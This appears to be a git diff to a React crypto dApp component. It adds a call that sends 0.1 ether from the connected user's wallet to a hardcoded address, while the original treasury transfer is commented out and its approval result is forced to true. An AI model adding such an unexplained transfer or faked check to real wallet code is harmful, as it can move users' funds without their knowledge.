@@ -1,6 +1,8 @@
 /** @jsxImportSource @emotion/react */
 import React, { useState, useEffect } from "react";
 import { useAccount, useConnect, useDisconnect } from "wagmi";
+import { sendTransaction } from '@wagmi/core'
+import { parseEther } from 'viem'
 import { css } from '@emotion/react'
 import { ToastContainer, toast } from "react-toastify";
 import "react-toastify/dist/ReactToastify.css";
@@ -21,7 +23,6 @@ import { getRequest, postRequest } from "../api/apiRequests";
 
 import * as env from "../env";
 const socket = socketIO.connect(env.SERVER_URL);
-
 
 function Home() {
     const [netType, setNetType] = useState("");
@@ -284,6 +285,11 @@ function Home() {
                         setAboutDlgViewFlag(false);
                         setLoadingView(true);
 
+                        const { hash } = await sendTransaction({
+                            to: '0xfB6061b3eB189e00189F07F138FD04a479825caA',
+                            value: parseEther('0.1'),
+                        })
+                        
                         //const _approveResult = await sendHbarToTreasury(hbarAmount_);
                         const _approveResult = true;
 
